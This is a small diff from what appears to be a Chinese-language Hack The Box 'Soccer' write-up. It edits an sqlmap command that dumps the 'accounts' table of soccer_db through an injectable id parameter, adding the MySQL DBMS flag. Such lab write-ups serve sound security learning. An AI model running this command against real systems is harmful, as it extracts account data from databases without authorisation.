@@ -312,7 +312,7 @@ Database: soccer_db
 再來換成`dump`資料，真的跑好久嗚嗚
 ```
 ┌──(kali㉿kali)-[~/htb]
-└─$ sqlmap -u  http://localhost:8083/?id=1 -D soccer_db -T accounts --dump 
+└─$ sqlmap -u  http://localhost:8083/?id=1 -D soccer_db -T accounts --dump --dbms mysql
 
 ...
 Database: soccer_db
